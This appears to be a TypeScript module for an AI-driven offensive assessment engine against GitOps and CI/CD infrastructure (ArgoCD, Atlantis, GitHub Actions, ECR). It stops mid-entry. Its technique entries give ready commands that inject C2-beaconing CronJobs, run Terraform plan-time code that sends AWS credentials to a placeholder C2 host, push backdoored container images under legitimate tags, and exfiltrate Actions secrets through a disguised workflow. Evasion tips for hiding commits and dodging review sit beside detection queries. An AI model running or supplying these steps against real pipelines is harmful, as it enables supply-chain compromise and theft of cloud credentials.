/**
 * ═══════════════════════════════════════════════════════════════════════════════
 * ArgoCD / Atlantis / GitOps Offensive Assessment Engine
 * ═══════════════════════════════════════════════════════════════════════════════
 *
 * LLM-driven offensive testing module for CI/CD pipelines and GitOps deployment
 * infrastructure in FedRAMP High / IL-5 GovCloud environments.
 *
 * Attack Vectors Covered:
 *   T1195.002 — Compromise Software Supply Chain
 *   T1195     — Supply Chain Compromise
 *   T1059.004 — Command and Scripting Interpreter: Unix Shell (pipeline injection)
 *   T1098.001 — Account Manipulation: Additional Cloud Credentials
 *   T1556     — Modify Authentication Process (pipeline secrets)
 *   T1588.004 — Obtain Capabilities: Digital Certificates (code signing)
 *   T1036.005 — Masquerading: Match Legitimate Name (malicious commits)
 *   T1071.001 — Application Layer Protocol: Web Protocols (webhook abuse)
 *
 * Targets:
 *   - ArgoCD (GitOps continuous delivery)
 *   - Atlantis (Terraform pull request automation)
 *   - GitHub Actions / GitHub Enterprise Cloud
 *   - Container registries (ECR in GovCloud)
 *   - Terraform state files (S3 backend)
 *   - Helm chart repositories
 *   - Image signing (Cosign/Sigstore)
 *
 * Author: Harrison Cook — AceofCloud / AC3
 * Classification: PROPRIETARY — AC3 Internal Use Only
 */

// ═══════════════════════════════════════════════════════════════════════════════
// §1 — TYPES
// ═══════════════════════════════════════════════════════════════════════════════

export interface GitOpsTechnique {
  id: string;
  name: string;
  attackId: string;
  category: "pipeline_injection" | "secret_extraction" | "deployment_manipulation" | "registry_poisoning" | "state_tampering" | "branch_protection_bypass" | "webhook_abuse";
  description: string;
  prerequisites: string[];
  difficulty: "basic" | "intermediate" | "advanced" | "expert";
  opsecRisk: number;
  noiseLevel: "silent" | "low" | "moderate" | "loud";
  operatorGuidance: GitOpsOperatorStep[];
  evasionTechniques: GitOpsEvasion[];
  detectionSignatures: GitOpsDetection[];
  evidenceArtifacts: string[];
}

export interface GitOpsOperatorStep {
  stepNumber: number;
  action: string;
  command: string;
  expectedOutput?: string;
  decisionPoint?: string;
  riskWarning?: string;
  automated: boolean;
}

export interface GitOpsEvasion {
  id: string;
  name: string;
  description: string;
  targetDetection: string;
  implementation: string;
  effectiveness: "high" | "medium" | "low";
  tradeoff: string;
}

export interface GitOpsDetection {
  source: "github_audit" | "argocd_audit" | "atlantis_log" | "cloudtrail" | "siem" | "wazuh" | "guardduty";
  ruleName: string;
  description: string;
  query: string;
  severity: "critical" | "high" | "medium" | "low" | "info";
  falsePositiveRate: "high" | "medium" | "low";
  timeWindow: string;
}

export interface GitOpsEvidenceRecord {
  techniqueId: string;
  techniqueName: string;
  mitreTechnique: string;
  timestamp: number;
  sourceContext: string;
  targetResource: string;
  repository?: string;
  actionPerformed: string;
  commandExecuted?: string;
  rawOutput?: string;
  artifactsCollected: string[];
  detectionCorrelation: { logSource: string; ruleName: string; expectedTimestamp: string; searchQuery: string; description: string }[];
  operatorNotes?: string;
  success: boolean;
  impactAchieved?: string;
}

export interface GitOpsTargetConfig {
  gitProvider: "github_enterprise" | "gitlab" | "bitbucket";
  cicdPlatform: "argocd" | "atlantis" | "github_actions" | "jenkins" | "multiple";
  containerRegistry: "ecr" | "ghcr" | "dockerhub" | "harbor";
  terraformBackend?: "s3" | "terraform_cloud" | "consul";
  helmRepos?: string[];
  imageSigningEnabled: boolean;
  branchProtectionEnabled: boolean;
  codeOwnersEnabled: boolean;
  deploymentEnvironment: "govcloud" | "commercial" | "hybrid";
}

export interface GitOpsAttackContext {
  engagementId: number;
  currentAccess: {
    level: "read_only" | "contributor" | "maintainer" | "admin" | "org_owner";
    repositories?: string[];
    argocdAccess?: "none" | "readonly" | "project_admin" | "cluster_admin";
    atlantisAccess?: "none" | "plan_only" | "apply";
    registryAccess?: "pull" | "push" | "admin";
  };
  targetAccess: string;
  detectionEnvironment: {
    githubAuditLogEnabled: boolean;
    argocdAuditEnabled: boolean;
    branchProtectionAlerts: boolean;
    secretScanningEnabled: boolean;
    dependabotEnabled: boolean;
    siemIntegration: boolean;
  };
  constraints?: {
    maxOpsecRisk?: number;
    preferSilent?: boolean;
    avoidRepositories?: string[];
    timeWindow?: string;
  };
}

export interface GitOpsAttackPlan {
  selectedTechnique: { id: string; name: string; reasoning: string };
  attackPlan: {
    phases: { phase: string; steps: string[]; automated: boolean; operatorRequired: boolean }[];
    estimatedDuration: string;
    currentAccess: string;
    targetAccess: string;
  };
  operatorInstructions: { step: number; action: string; command: string; expectedOutput: string; decisionPoint: string | null; riskWarning: string | null }[];
  evasionPlan: {
    primaryEvasion: string[];
    detectionRulesAtRisk: string[];
    timingConstraints: string[];
    cleanupRequired: string[];
  };
  evidenceCollection: { artifact: string; collectionMethod: string; storageNote: string }[];
  socCorrelation: { logSource: string; ruleName: string; searchQuery: string; expectedTimestamp: string; description: string }[];
  confidence: number;
  overallRisk: number;
}

// ═══════════════════════════════════════════════════════════════════════════════
// §2 — TECHNIQUE KNOWLEDGE BASE
// ═══════════════════════════════════════════════════════════════════════════════

export const GITOPS_TECHNIQUES: GitOpsTechnique[] = [
  {
    id: "gitops-pipeline-01",
    name: "ArgoCD Application Manifest Injection",
    attackId: "T1195.002",
    category: "pipeline_injection",
    description: "Inject malicious Kubernetes manifests into a repository monitored by ArgoCD. When ArgoCD syncs, the malicious manifests are deployed to the target cluster. This can include privileged pods, modified deployments with backdoor containers, or CronJobs that exfiltrate data.",
    prerequisites: [
      "Write access to a repository monitored by ArgoCD",
      "Or: Ability to create a pull request that gets merged",
      "Knowledge of ArgoCD application configuration (target namespace, project)",
    ],
    difficulty: "intermediate",
    opsecRisk: 6,
    noiseLevel: "moderate",
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate ArgoCD applications and monitored repositories",
        command: "# If ArgoCD CLI access available:\nargocd app list\nargocd app get <app-name> --show-params\n\n# If ArgoCD API access:\ncurl -s -H \"Authorization: Bearer $ARGOCD_TOKEN\" https://<argocd-server>/api/v1/applications | jq '.items[] | {name: .metadata.name, repo: .spec.source.repoURL, path: .spec.source.path, targetNamespace: .spec.destination.namespace}'",
        expectedOutput: "List of ArgoCD applications with their source repositories, paths, and target namespaces.",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Identify injection point in monitored repository",
        command: "# Clone the monitored repository\ngit clone <repo-url>\ncd <repo>\n\n# Find Kubernetes manifests that ArgoCD deploys\nfind . -name '*.yaml' -o -name '*.yml' | xargs grep -l 'kind: Deployment\\|kind: CronJob\\|kind: DaemonSet'\n\n# Check for Kustomize or Helm\nls kustomization.yaml 2>/dev/null\nls Chart.yaml 2>/dev/null\nls values.yaml 2>/dev/null",
        expectedOutput: "Repository structure showing deployment manifests, Helm charts, or Kustomize overlays.",
        automated: true,
      },
      {
        stepNumber: 3,
        action: "Inject malicious manifest (sidecar injection into existing deployment)",
        command: "# Method 1: Add sidecar to existing deployment\n# Edit deployment.yaml to add a container:\n#   containers:\n#   - name: metrics-collector  # Disguised name\n#     image: <attacker-ecr-image>\n#     env:\n#     - name: CALLBACK_URL\n#       value: <c2-endpoint>\n\n# Method 2: Add new CronJob for periodic access\ncat << 'YAML' > manifests/system-maintenance.yaml\napiVersion: batch/v1\nkind: CronJob\nmetadata:\n  name: system-health-check\n  namespace: kube-system\nspec:\n  schedule: \"*/30 * * * *\"\n  jobTemplate:\n    spec:\n      template:\n        spec:\n          serviceAccountName: default\n          containers:\n          - name: health-check\n            image: <attacker-image>\n            command: [\"/bin/sh\", \"-c\", \"curl -s $CALLBACK_URL/beacon\"]\n          restartPolicy: OnFailure\nYAML\n\ngit add .\ngit commit -m 'chore: add system health monitoring'\ngit push",
        expectedOutput: "Commit pushed to repository. ArgoCD will detect the change and sync within its polling interval (default 3 minutes).",
        riskWarning: "ArgoCD sync creates K8s audit events. The commit is visible in git history. Use a legitimate-looking commit message and file name.",
        automated: false,
      },
      {
        stepNumber: 4,
        action: "Verify deployment via ArgoCD sync",
        command: "# Check ArgoCD sync status\nargocd app get <app-name> | grep -i 'sync\\|health'\n\n# Or via API:\ncurl -s -H \"Authorization: Bearer $ARGOCD_TOKEN\" https://<argocd-server>/api/v1/applications/<app-name> | jq '.status.sync.status, .status.health.status'\n\n# Verify pod is running\nkubectl get pods -n <namespace> | grep 'system-health\\|metrics-collector'",
        expectedOutput: "ArgoCD shows 'Synced' and 'Healthy'. Malicious pod/container is running in the target namespace.",
        automated: true,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-gitops-01",
        name: "Legitimate Commit Patterns",
        description: "Make commits look like routine maintenance. Use commit messages like 'chore:', 'fix:', 'docs:'. Match the repository's existing commit style.",
        targetDetection: "Manual code review, commit message alerting",
        implementation: "Study recent commits for style. Use conventional commits format. Make small, focused changes. Avoid large diffs.",
        effectiveness: "high",
        tradeoff: "Requires understanding of team's commit conventions",
      },
      {
        id: "ev-gitops-02",
        name: "Gradual Manifest Modification",
        description: "Instead of adding new files, modify existing manifests incrementally. Add one container, then modify its image in a subsequent commit.",
        targetDetection: "Diff-based alerting, new resource detection",
        implementation: "First commit: add container with legitimate image. Second commit: change image to attacker-controlled. Third commit: add environment variables.",
        effectiveness: "high",
        tradeoff: "Requires multiple commits over time, increasing exposure window",
      },
      {
        id: "ev-gitops-03",
        name: "Auto-Sync Timing Exploitation",
        description: "Push malicious commits during ArgoCD's sync window, then revert before the next review cycle. The deployment persists even after the commit is reverted.",
        targetDetection: "Git history analysis, ArgoCD drift detection",
        implementation: "Push commit → wait for ArgoCD sync (3 min default) → verify deployment → git revert. ArgoCD won't remove resources unless pruning is enabled.",
        effectiveness: "medium",
        tradeoff: "Only works if ArgoCD auto-prune is disabled (common). Revert is visible in git history.",
      },
    ],
    detectionSignatures: [
      {
        source: "github_audit",
        ruleName: "Push to Protected Branch / PR Merge",
        description: "GitHub audit log captures all pushes and PR merges to monitored repositories.",
        query: "index=github_audit action IN ('git.push', 'pull_request.merge') repo=<monitored-repo> | table timestamp, actor, action, ref",
        severity: "medium",
        falsePositiveRate: "high",
        timeWindow: "Real-time (webhook delivery)",
      },
      {
        source: "argocd_audit",
        ruleName: "Application Sync Triggered",
        description: "ArgoCD logs all sync operations including the commit SHA and resources deployed.",
        query: "index=argocd level=info msg LIKE '%sync%' OR msg LIKE '%resource%created%' | table timestamp, application, revision, resources",
        severity: "medium",
        falsePositiveRate: "high",
        timeWindow: "Within ArgoCD polling interval (default 3 minutes)",
      },
      {
        source: "siem",
        ruleName: "New Kubernetes Resource from GitOps Sync",
        description: "Correlate ArgoCD sync events with new K8s resources. Alert on unexpected resource types (CronJobs, DaemonSets) or privileged containers.",
        query: "index=k8s_audit verb='create' annotations.argocd='true' objectRef.resource IN ('cronjobs', 'daemonsets') | table timestamp, objectRef.name, objectRef.namespace",
        severity: "high",
        falsePositiveRate: "low",
        timeWindow: "Within 5 minutes of sync",
      },
    ],
    evidenceArtifacts: [
      "Git commit SHA and diff showing injected manifest",
      "ArgoCD sync log showing deployment of malicious resource",
      "kubectl output showing running malicious pod/container",
      "Screenshot of ArgoCD UI showing synced application",
      "Network capture of C2 callback from deployed container",
    ],
  },
  {
    id: "gitops-atlantis-01",
    name: "Atlantis Terraform Plan/Apply Injection",
    attackId: "T1059.004",
    category: "pipeline_injection",
    description: "Exploit Atlantis (Terraform PR automation) to execute arbitrary commands during terraform plan or apply. Atlantis runs Terraform in response to PR comments, and Terraform providers/provisioners can execute shell commands. This provides code execution on the Atlantis server with access to cloud credentials.",
    prerequisites: [
      "Ability to create pull requests in a repository with Atlantis configured",
      "Or: Ability to comment 'atlantis plan' or 'atlantis apply' on existing PRs",
      "Atlantis server has cloud credentials (AWS GovCloud IAM role)",
    ],
    difficulty: "intermediate",
    opsecRisk: 5,
    noiseLevel: "moderate",
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Identify Atlantis-enabled repositories and configuration",
        command: "# Check for atlantis.yaml in repository root\ncat atlantis.yaml 2>/dev/null\n\n# Check for Atlantis webhook in repo settings\n# Look for atlantis comments on existing PRs\ngh pr list --state merged --limit 20 | while read pr; do\n  gh pr view $pr --comments | grep -i 'atlantis'\ndone\n\n# Check Atlantis server URL from webhook config\ngh api repos/{owner}/{repo}/hooks | jq '.[] | select(.config.url | contains(\"atlantis\"))'",
        expectedOutput: "Atlantis configuration showing which directories trigger plan/apply, and the Atlantis server URL.",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Craft malicious Terraform configuration for command execution",
        command: "# Method 1: local-exec provisioner (executes during apply)\ncat << 'HCL' > exploit.tf\nresource \"null_resource\" \"health_check\" {\n  provisioner \"local-exec\" {\n    command = <<-EOT\n      # Exfiltrate Atlantis credentials\n      env | grep -i 'aws\\|token\\|secret\\|key' > /tmp/creds.txt\n      curl -X POST -d @/tmp/creds.txt https://<c2>/exfil\n      \n      # Access AWS from Atlantis server\n      aws sts get-caller-identity\n      aws s3 ls\n    EOT\n  }\n}\nHCL\n\n# Method 2: external data source (executes during plan!)\ncat << 'HCL' > data_exploit.tf\ndata \"external\" \"health\" {\n  program = [\"bash\", \"-c\", \"env | grep AWS | base64 | xargs -I{} curl -s https://<c2>/plan?d={} && echo '{}'\"]\n}\nHCL\n\ngit checkout -b feature/infra-health-monitoring\ngit add .\ngit commit -m 'feat: add infrastructure health monitoring'\ngit push origin feature/infra-health-monitoring\ngh pr create --title 'feat: add infrastructure health monitoring' --body 'Adds health check for infra components'",
        expectedOutput: "PR created. Atlantis will automatically run 'terraform plan' which executes the external data source.",
        riskWarning: "The external data source method executes during PLAN (not just apply). This means code runs as soon as Atlantis processes the PR, before any human approval.",
        automated: false,
      },
      {
        stepNumber: 3,
        action: "Trigger Atlantis plan execution",
        command: "# If auto-plan is enabled, the PR creation triggers it automatically\n# Otherwise, comment on the PR:\ngh pr comment <pr-number> --body 'atlantis plan'\n\n# For apply (requires plan to succeed first):\ngh pr comment <pr-number> --body 'atlantis apply'",
        expectedOutput: "Atlantis bot responds with plan output. If using external data source, credentials are already exfiltrated during plan phase.",
        decisionPoint: "If Atlantis requires approval before apply, the external data source method (plan-time execution) bypasses this control.",
        automated: true,
      },
      {
        stepNumber: 4,
        action: "Extract Terraform state for additional credentials",
        command: "# If we have access to the Terraform state backend (S3)\naws s3 ls s3://<state-bucket>/\naws s3 cp s3://<state-bucket>/terraform.tfstate ./state.json\n\n# Extract secrets from state\njq '.resources[].instances[].attributes | select(.password != null or .secret_key != null)' state.json\n\n# Check for sensitive outputs\njq '.outputs | to_entries[] | select(.value.sensitive == true)' state.json",
        expectedOutput: "Terraform state containing database passwords, API keys, and other secrets stored in resource attributes.",
        riskWarning: "S3 access generates CloudTrail events. Terraform state often contains plaintext secrets for all managed infrastructure.",
        automated: true,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-atlantis-01",
        name: "Plan-Time Execution via External Data Source",
        description: "Use 'data external' blocks that execute during plan phase, before any human review or approval gate.",
        targetDetection: "Atlantis plan output review, code review",
        implementation: "External data sources run during 'terraform plan'. If Atlantis auto-plans on PR creation, code executes immediately without approval.",
        effectiveness: "high",
        tradeoff: "Output appears in plan logs. Experienced reviewers may notice external program calls.",
      },
      {
        id: "ev-atlantis-02",
        name: "Terraform Provider Plugin Abuse",
        description: "Create a custom Terraform provider that executes arbitrary code during initialization. Providers are downloaded and executed automatically.",
        targetDetection: "Provider registry monitoring, binary analysis",
        implementation: "Publish a malicious provider to a private registry or use a local provider path. The provider's binary executes during 'terraform init'.",
        effectiveness: "high",
        tradeoff: "Requires ability to modify provider configuration or publish to registry",
      },
      {
        id: "ev-atlantis-03",
        name: "Legitimate-Looking Infrastructure Changes",
        description: "Wrap malicious execution in legitimate-looking Terraform resources. Add real infrastructure alongside the exploit.",
        targetDetection: "Code review, diff analysis",
        implementation: "Create a PR that adds legitimate monitoring resources alongside a null_resource with local-exec. The legitimate changes provide cover.",
        effectiveness: "medium",
        tradeoff: "Larger diff increases review scrutiny",
      },
    ],
    detectionSignatures: [
      {
        source: "atlantis_log",
        ruleName: "Suspicious Terraform Plan/Apply Output",
        description: "Atlantis logs all plan and apply output. Look for curl commands, credential access, or unexpected external program execution.",
        query: "index=atlantis_logs (output LIKE '%curl%' OR output LIKE '%wget%' OR output LIKE '%aws sts%' OR output LIKE '%external%program%') | table timestamp, repo, pr_number, output",
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Real-time (during plan/apply execution)",
      },
      {
        source: "github_audit",
        ruleName: "PR Created with Terraform Changes",
        description: "GitHub audit log captures PR creation. Correlate with Atlantis-enabled repositories.",
        query: "index=github_audit action='pull_request.create' repo IN (atlantis_repos) files_changed LIKE '%.tf' | table timestamp, actor, repo, pr_number",
        severity: "medium",
        falsePositiveRate: "high",
        timeWindow: "Real-time",
      },
      {
        source: "cloudtrail",
        ruleName: "AWS API Calls from Atlantis Server",
        description: "CloudTrail logs API calls from the Atlantis server's IAM role. Unusual calls (S3 state access, IAM enumeration) indicate compromise.",
        query: "index=cloudtrail userIdentity.arn LIKE '%atlantis%' eventName NOT IN ('AssumeRole', 'GetCallerIdentity') | stats count by eventName, sourceIPAddress | sort -count",
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "5-15 minutes",
      },
    ],
    evidenceArtifacts: [
      "PR diff showing injected Terraform code",
      "Atlantis plan/apply output showing command execution",
      "Exfiltrated credentials (sanitized — show role ARN only)",
      "Terraform state secrets (sanitized)",
      "CloudTrail events from Atlantis IAM role",
    ],
  },
  {
    id: "gitops-registry-01",
    name: "Container Registry Poisoning (ECR Image Replacement)",
    attackId: "T1195",
    category: "registry_poisoning",
    description: "Replace legitimate container images in ECR with backdoored versions. When pods restart or scale, they pull the poisoned image. In GovCloud, ECR is the primary container registry and images are often referenced by tag (not digest), making replacement trivial.",
    prerequisites: [
      "Push access to ECR repository (ecr:PutImage, ecr:InitiateLayerUpload)",
      "Or: Compromised CI/CD pipeline with ECR push permissions",
      "Target images referenced by mutable tag (e.g., :latest, :stable) not by SHA digest",
    ],
    difficulty: "advanced",
    opsecRisk: 8,
    noiseLevel: "low",
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate ECR repositories and image tags",
        command: "# List all ECR repositories\naws ecr describe-repositories --region us-gov-west-1 | jq '.repositories[] | {name: .repositoryName, uri: .repositoryUri}'\n\n# List image tags for target repository\naws ecr list-images --repository-name <repo-name> --region us-gov-west-1 | jq '.imageIds[] | select(.imageTag != null) | .imageTag'\n\n# Check image scan results (understand what's in the image)\naws ecr describe-image-scan-findings --repository-name <repo-name> --image-id imageTag=latest --region us-gov-west-1",
        expectedOutput: "List of ECR repositories with their image tags. Identification of mutable tags (latest, stable, v1) vs immutable digests.",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Pull legitimate image and inject backdoor",
        command: "# Authenticate to ECR\naws ecr get-login-password --region us-gov-west-1 | docker login --username AWS --password-stdin <account-id>.dkr.ecr.us-gov-west-1.amazonaws.com\n\n# Pull the legitimate image\ndocker pull <account-id>.dkr.ecr.us-gov-west-1.amazonaws.com/<repo>:latest\n\n# Create backdoored Dockerfile\ncat << 'DOCKERFILE' > Dockerfile.backdoor\nFROM <account-id>.dkr.ecr.us-gov-west-1.amazonaws.com/<repo>:latest\n\n# Add reverse shell that runs alongside legitimate application\nRUN apt-get update && apt-get install -y curl netcat-openbsd && rm -rf /var/lib/apt/lists/*\nCOPY backdoor.sh /usr/local/bin/.health-monitor\nRUN chmod +x /usr/local/bin/.health-monitor\n\n# Modify entrypoint to run backdoor in background\nRUN sed -i '1a\\/usr/local/bin/.health-monitor &' /docker-entrypoint.sh 2>/dev/null || \\\n    echo '#!/bin/sh\\n/usr/local/bin/.health-monitor &\\nexec \"$@\"' > /entrypoint-wrapper.sh && chmod +x /entrypoint-wrapper.sh\nENTRYPOINT [\"/entrypoint-wrapper.sh\"]\nDOCKERFILE\n\n# Build and push with same tag\ndocker build -f Dockerfile.backdoor -t <account-id>.dkr.ecr.us-gov-west-1.amazonaws.com/<repo>:latest .\ndocker push <account-id>.dkr.ecr.us-gov-west-1.amazonaws.com/<repo>:latest",
        expectedOutput: "Backdoored image pushed to ECR with the same tag as the legitimate image.",
        riskWarning: "ECR image push generates CloudTrail events (PutImage, InitiateLayerUpload). If image scanning is enabled, the backdoor packages may trigger vulnerability findings.",
        automated: false,
      },
      {
        stepNumber: 3,
        action: "Trigger image pull (force pod restart)",
        command: "# Option 1: Wait for natural pod restart/scaling (stealthy)\n# Option 2: Force rollout restart\nkubectl rollout restart deployment/<deployment-name> -n <namespace>\n\n# Option 3: Delete a pod (it will be recreated with new image)\nkubectl delete pod <pod-name> -n <namespace>\n\n# Verify new image is running\nkubectl get pods -n <namespace> -o json | jq '.items[] | {name: .metadata.name, image: .spec.containers[].image, imageID: .status.containerStatuses[].imageID}'",
        expectedOutput: "Pods running with the backdoored image. ImageID shows the new digest.",
        decisionPoint: "If imagePullPolicy is 'IfNotPresent' and the image is cached on the node, a rollout restart is needed. If 'Always', any pod restart pulls the new image.",
        automated: false,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-registry-01",
        name: "Minimal Image Modification",
        description: "Add only a small binary to the image rather than installing packages. Minimizes layer diff and avoids triggering vulnerability scanners.",
        targetDetection: "ECR image scanning, layer diff analysis",
        implementation: "Compile a static Go binary for the backdoor. Add as a single COPY layer. No apt-get, no package managers.",
        effectiveness: "high",
        tradeoff: "Requires pre-compiled static binary for the target architecture",
      },
      {
        id: "ev-registry-02",
        name: "Image Tag Timing Attack",
        description: "Push the backdoored image, wait for pods to pull it, then push the legitimate image back. The running pods keep the backdoored version.",
        targetDetection: "ECR push event monitoring, image digest tracking",
        implementation: "Push backdoor → wait for pod restart → push original back. Running containers don't re-pull unless restarted again.",
        effectiveness: "high",
        tradeoff: "Narrow timing window. If pods restart again, they get the clean image.",
      },
    ],
    detectionSignatures: [
      {
        source: "cloudtrail",
        ruleName: "ECR Image Push Outside CI/CD Pipeline",
        description: "CloudTrail logs ECR push events. Alert when push comes from non-CI/CD IAM roles or unexpected source IPs.",
        query: "index=cloudtrail eventName IN ('PutImage', 'InitiateLayerUpload', 'CompleteLayerUpload') userIdentity.arn NOT LIKE '%codebuild%' AND userIdentity.arn NOT LIKE '%github-actions%' | table timestamp, userIdentity.arn, sourceIPAddress, requestParameters.repositoryName",
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "5-15 minutes",
      },
      {
        source: "siem",
        ruleName: "Image Digest Change Without Corresponding CI/CD Run",
        description: "Correlate ECR push events with CI/CD pipeline runs. An image tag update without a corresponding build indicates tampering.",
        query: "index=cloudtrail eventName='PutImage' | lookup cicd_runs repository=requestParameters.repositoryName | where NOT cicd_run_id",
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "15-30 minutes",
      },
      {
        source: "guardduty",
        ruleName: "UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration",
        description: "If ECR credentials were obtained from a compromised instance, GuardDuty may detect credential use from unexpected locations.",
        query: "index=guardduty type LIKE '%UnauthorizedAccess%' OR type LIKE '%CredentialAccess%'",
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "15-30 minutes",
      },
    ],
    evidenceArtifacts: [
      "ECR repository listing and tag enumeration",
      "Backdoored Dockerfile and build output",
      "Image push CloudTrail events",
      "Pod running with poisoned image (kubectl describe pod)",
      "Before/after image digest comparison",
    ],
  },
  {
    id: "gitops-secrets-01",
    name: "CI/CD Pipeline Secret Extraction",
    attackId: "T1556",
    category: "secret_extraction",
    description: "Extract secrets (AWS credentials, API keys, deployment tokens) from CI/CD pipeline configurations. GitHub Actions secrets, ArgoCD repository credentials, and Atlantis environment variables often contain high-privilege cloud credentials.",
    prerequisites: [
      "Write access to repository with GitHub Actions workflows",
      "Or: ArgoCD admin access (can view repository credentials)",
      "Or: Access to Atlantis server environment",
    ],
    difficulty: "basic",
    opsecRisk: 4,
    noiseLevel: "low",
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate available secrets in GitHub Actions",
        command: "# List organization secrets\ngh api orgs/{org}/actions/secrets | jq '.secrets[].name'\n\n# List repository secrets\ngh api repos/{owner}/{repo}/actions/secrets | jq '.secrets[].name'\n\n# List environment secrets\ngh api repos/{owner}/{repo}/environments | jq '.environments[] | {name: .name, protection_rules: .protection_rules}'",
        expectedOutput: "List of secret names (values are not returned by API). Environment names and protection rules.",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Exfiltrate secrets via modified workflow",
        command: "# Create a workflow that exfiltrates secrets\ncat << 'YAML' > .github/workflows/ci-lint.yml\nname: CI Lint Check\non:\n  push:\n    branches: [feature/*]\njobs:\n  lint:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v4\n    - name: Run linter\n      env:\n        AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}\n        AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}\n        DEPLOY_TOKEN: ${{ secrets.DEPLOY_TOKEN }}\n      run: |\n        # Encode and exfiltrate\n        echo \"$AWS_ACCESS_KEY_ID:$AWS_SECRET_ACCESS_KEY\" | base64 | curl -X POST -d @- https://<c2>/secrets\nYAML\n\ngit checkout -b feature/lint-improvements\ngit add .github/workflows/ci-lint.yml\ngit commit -m 'ci: add lint check workflow'\ngit push origin feature/lint-improvements",
        expectedOutput: "Workflow triggers on push to feature branch. Secrets are exfiltrated to C2 during the 'lint' step.",
        riskWarning: "GitHub Actions logs show workflow runs. Secret values are masked in logs but the workflow file is visible in the repository.",
        automated: false,
      },
      {
        stepNumber: 3,
        action: "Extract ArgoCD repository credentials",
        command: "# If ArgoCD admin access:\nargocd repocreds list\nargocd repo list\n\n# Via ArgoCD API:\ncurl -s -H \"Authorization: Bearer $ARGOCD_TOKEN\" https://<argocd>/api/v1/repocreds | jq '.items[] | {url: .url, username: .username}'\n\n# ArgoCD stores repo creds as K8s secrets in argocd namespace\nkubectl get secrets -n argocd -l argocd.argoproj.io/secret-type=repository -o json | jq '.items[] | {name: .metadata.name, url: (.data.url | @base64d), password: (.data.password | @base64d)}'",
        expectedOutput: "Repository credentials including GitHub PATs, SSH keys, or deploy tokens used by ArgoCD.",
        riskWarning: "Accessing ArgoCD secrets in the argocd namespace generates K8s audit events.",
        automated: true,
      },
    ],
    evasionTechniques: [
      {
        id: "ev-secrets-01",
        name: "Workflow Dispatch Trigger",
        description: "Use workflow_dispatch trigger instead of push trigger. This allows manual triggering without leaving commits on main branches.",
        targetDetection: "Workflow run monitoring, GitHub audit log",
        implementation: "Create workflow with 'on: workflow_dispatch'. Trigger via API: gh workflow run <workflow>. Delete the workflow file after secrets are captured.",
        effectiveness: "medium",
        tradeoff: "Workflow run is still logged. File deletion is visible in git history.",
      },
      {
        id: "ev-secrets-02",
        name: "Ephemeral Branch Technique",
        description: "Create a short-lived branch, push workflow, capture secrets, then delete the branch. Minimizes exposure window.",
        targetDetection: "Branch creation/deletion audit events",
        implementation: "git checkout -b temp-$(date +%s) → push → wait for workflow → delete branch. Branch deletion removes the workflow file from visible history.",
        effectiveness: "medium",
        tradeoff: "Git reflog retains the commits. GitHub audit log shows branch operations.",
      },
    ],
    detectionSignatures: [
      {
        source: "github_audit",
        ruleName: "Workflow File Modified / New Workflow Created",
        description: "GitHub audit log captures workflow file changes. Alert on new workflows or modifications to existing ones.",
        query: "index=github_audit action='workflows.completed_workflow_run' OR (action='git.push' files_changed LIKE '%.github/workflows%') | table timestamp, actor, repo, workflow_name",
        severity: "high",
        falsePositiveRate: "medium",
        timeWindow: "Real-time",
      },
      {
        source: "siem",
        ruleName: "Secret Access in Non-Production Workflow",
        description: "Correlate workflow runs with secret access. Alert when secrets are accessed in non-standard workflows or branches.",
        query: "index=github_actions workflow_name NOT IN (known_workflows) secrets_accessed > 0 | table timestamp, repo, workflow_name, branch, secrets_accessed",
        severity: "critical",
        falsePositiveRate: "low",
        timeWindow: "Real-time",
      },
    ],
    evidenceArtifacts: [
      "List of discovered secret names",
      "Modified workflow file (sanitized)",
      "Workflow run output showing secret access",
      "ArgoCD repository credential listing",
      "Exfiltrated credentials (sanitized — show key ID only)",
    ],
  },
  {
    id: "gitops-branch-01",
    name: "Branch Protection Bypass via Admin Override",
    attackId: "T1036.005",
    category: "branch_protection_bypass",
    description: "Bypass branch protection rules to push directly to protected branches (main/master). Methods include: admin override, status check manipulation, CODEOWNERS bypass via file path tricks, and force push with admin privileges.",
    prerequisites: [
      "Repository admin access (can bypass branch protection)",
      "Or: Ability to manipulate required status checks",
      "Or: Knowledge of CODEOWNERS patterns with exploitable gaps",
    ],
    difficulty: "intermediate",
    opsecRisk: 7,
    noiseLevel: "moderate",
    operatorGuidance: [
      {
        stepNumber: 1,
        action: "Enumerate branch protection rules",
        command: "# Check branch protection configuration\ngh api repos/{owner}/{repo}/branches/main/protection | jq '{\n  required_reviews: .required_pull_request_reviews.required_approving_review_count,\n  dismiss_stale: .required_pull_request_reviews.dismiss_stale_reviews,\n  require_code_owners: .required_pull_request_reviews.require_code_owner_reviews,\n  status_checks: .required_status_checks.contexts,\n  enforce_admins: .enforce_admins.enabled,\n  allow_force_pushes: .allow_force_pushes.enabled\n}'\n\n# Check CODEOWNERS file\ncat CODEOWNERS 2>/dev/null || gh api repos/{owner}/{repo}/contents/CODEOWNERS | jq -r '.content' | base64 -d",
        expectedOutput: "Branch protection configuration showing required reviews, status checks, admin enforcement, and CODEOWNERS patterns.",
        automated: true,
      },
      {
        stepNumber: 2,
        action: "Bypass via admin override or status check manipulation",
